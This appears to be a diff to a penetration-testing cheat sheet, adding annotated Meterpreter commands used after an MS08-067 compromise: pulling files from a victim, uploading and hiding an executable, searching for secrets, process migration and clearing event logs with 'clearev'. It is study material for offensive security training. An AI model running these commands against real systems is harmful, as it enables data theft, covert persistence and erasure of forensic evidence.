@@ -143,7 +143,14 @@ $ info windows/smb/ms08_067_netapi // gives information and description about th
 ```
 ```
 Meterpreter session 1 opened!
+> download C:\\Users\\els\\Desktop\\file.txt // Downloads file.txt to local host from target
+> upload clickme.exe C:\\Users\\els\\Desktop\\clickme.exe // Uploads executable file to user desktop
+> execute -f cmd.exe -i H // Run executable and hide process from victim's view
+> search -f secret.* // Search victim filesystem for file name secret with variable extension
+> run post/windows/gather/enum_applications // Can run various post-exploitation scripts to gather more info
+> ps && migrate <ProcessID> // List all processes then migrate to a chosen process ID
 
+> clearev
 ```
 ```
 Crack collected LM/NT hashes w/ Rainbow Tables
